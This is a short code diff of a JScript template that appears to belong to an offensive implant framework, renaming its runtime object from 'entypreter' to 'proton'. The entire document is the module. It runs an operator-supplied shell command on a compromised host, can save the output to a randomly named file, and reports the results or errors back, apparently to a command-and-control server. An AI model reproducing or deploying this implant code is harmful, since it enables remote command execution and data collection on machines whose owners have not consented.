@@ -3,23 +3,23 @@ try
     var readout = ~OUTPUT~;
     if (readout)
     {
-        var output = entypreter.shell.exec("~FCMD~", "~FDIRECTORY~\\"+entypreter.uuid()+".txt");
+        var output = proton.shell.exec("~FCMD~", "~FDIRECTORY~\\"+proton.uuid()+".txt");
     }
     else
     {
         var output = "";
-        entypreter.shell.run("~FCMD~");
-        entypreter.work.report();
+        proton.shell.run("~FCMD~");
+        proton.work.report();
     }
 
     if (output != "")
     {
-        entypreter.work.report(output);
+        proton.work.report(output);
     }
 }
 catch (e)
 {
-    entypreter.work.error(e);
+    proton.work.error(e);
 }
 
-entypreter.exit();
+proton.exit();
